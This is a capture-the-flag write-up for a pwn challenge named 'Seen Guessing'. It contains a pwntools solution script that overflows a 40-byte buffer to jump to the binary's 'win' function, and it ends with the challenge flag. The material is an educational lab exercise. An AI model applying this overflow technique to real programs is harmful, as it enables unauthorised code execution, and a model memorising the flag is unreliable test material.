# Seen Guessing
Solved by: @w6rstaimn

### Question:
Guess all the seens and you'll be rewarded with something special.

### Solution:
Here is the solution script:
```python
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x4013f4
continue
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe,checksec=True)
context.log_level = 'debug'


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


io = start()

offset  = 40
names = b'Sonbol Sabzeh Seer Seeb Senjed Samanu'
win = b'A'*offset + p64(elf.sym['win'])

io.sendline(names)
io.recvuntil(b'6/7 guessed')
io.sendlineafter(b':',win)
io.sendlineafter(b':',b'serkeh')
io.interactive()
```

**Flag:** `FMCTF{db8aa102093c65b674a0c216dac7cd73}`

